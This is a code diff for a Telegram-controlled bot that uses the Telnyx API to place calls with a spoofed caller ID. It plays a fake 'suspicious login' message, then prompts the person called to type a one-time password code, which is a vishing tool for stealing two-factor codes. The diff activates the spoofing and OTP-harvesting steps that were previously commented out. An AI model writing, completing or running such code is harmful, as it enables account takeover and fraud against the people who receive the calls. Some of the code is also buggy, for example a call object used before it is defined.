@@ -106,9 +106,9 @@ const adminFilter = (ctx, next) => {
 
 // bot is not making the calls. possible solution could be to recharge balance
 
-async function call (spoof, customer_number, ctx, service, digit){
+async function call (spoof, customer_number, ctx, service, name, digit){
    console.log('command is from: ', ctx.from)
-   // Use the Telnyx API to create a new call
+   // Using the Telnyx API to create a new call
    try {
       await bot.telegram.sendMessage(ctx.chat.id, `📞 Call has Started...`, {
          reply_markup:{
@@ -122,7 +122,11 @@ async function call (spoof, customer_number, ctx, service, digit){
             ]
          }
       }) 
-      bot.action('end', ctx => ctx.telegram.sendMessage(ctx.from.id, `❌ Call ended`, {}) )
+
+      bot.action('end', ctx => {
+         ctx.telegram.sendMessage(ctx.from.id, `❌ Call ended`, {})
+         call.hangup()
+      } )
 
       const { data: call } = await telnyx.calls.create({
          connection_id: alt_control_id,
@@ -130,7 +134,24 @@ async function call (spoof, customer_number, ctx, service, digit){
          from: service_number,
          from_display_name: `+${spoof}`,
          answering_machine_detection: 'detect'
-      });      
+      });   
+
+      if( call.answered ){
+         if ( !call.machine.detection.ended ) {
+            bot.telegram.sendMessage(ctx.chat.id, `📞 Human Detected`, {})
+         } else {
+            bot.telegram.sendMessage(ctx.chat.id, `📞 Voicemail Detected`, {})
+         }
+         call.gather_using_speak(
+         { 
+            connection_id: alt_control_id,
+            payload: `Hello ${name}, there has been a login to your ${service} account from a different location, press 1 if this was not you.`, 
+            language: 'en-US', 
+            voice: 'female',
+            webhook_url: `${WEBHOOK_URL}/pressed_one`
+         });
+      }
+
    } catch (error) {
       console.log("your error is: ", error.message)
    }
@@ -231,38 +252,22 @@ app.post('/', (req, res) => {
    res.json({status: 'ok', code: 200})
 });
 
-app.post('/answered', (req, res) => {
-   // Get the call_control_id from the webhook data
-   const data = req.body.data;
-   console.log(`expected webhook : ${data}`)
-
-   // const call_control_id = data.payload.call_control_id;
-   
-   // call.gather_using_speak(
-   // { 
-   //    call_control_id: call_control_id,
-   //    payload: `Hello ${name}, there has been a login to your ${service} account from a different location, press 1 if this was not you.`, 
-   //    language: 'en-US', 
-   //    voice: 'female'
-   // });
-
-})
 
 app.post('/webhooks/pressed_one', (req, res) => {
    // Get the call_control_id from the webhook data
    const data = req.body.data;
    console.log(`expected webhook : ${data}`)
 
-   // const call_control_id = data.payload.call_control_id;
+   const call_control_id = data.payload.call_control_id;
    
-   // call.gather_using_speak(
-   // { 
-   //    call_control_id: call_control_id,
-   //    payload: 'We have just sent you a one time password, kindly type the ${digit} digit code', 
-   //    language: 'en-US', 
-   //    voice: 'female',
-   //    webhook_url: '' 
-   // });
+   call.gather_using_speak(
+   { 
+      call_control_id: call_control_id,
+      payload: 'We have just sent you a one time password, kindly type the ${digit} digit code', 
+      language: 'en-US', 
+      voice: 'female',
+      webhook_url: `${ WEBHOOK_URL }/` 
+   });
 
 })
 
